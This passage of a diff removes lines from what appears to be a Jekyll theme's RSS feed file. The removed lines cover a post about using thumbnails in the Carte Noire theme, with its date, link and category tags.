-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;thumbnail: android
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Then in the future if you decide you want to use your own android icon you can just
-add it to &lt;code&gt;_data/thumbnails.yml&lt;/code&gt; which will override it for all articles using
-the android thumbnail.&lt;/p&gt;
-</description>
-        <pubDate>Sun, 08 Jun 2014 14:32:18 +0200</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/08/using-thumbnails/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/08/using-thumbnails/</guid>
-        
-        <category>thumbnails</category>
-        
-        <category>carte noire</category>
         
         
         <category>jekyll</category>
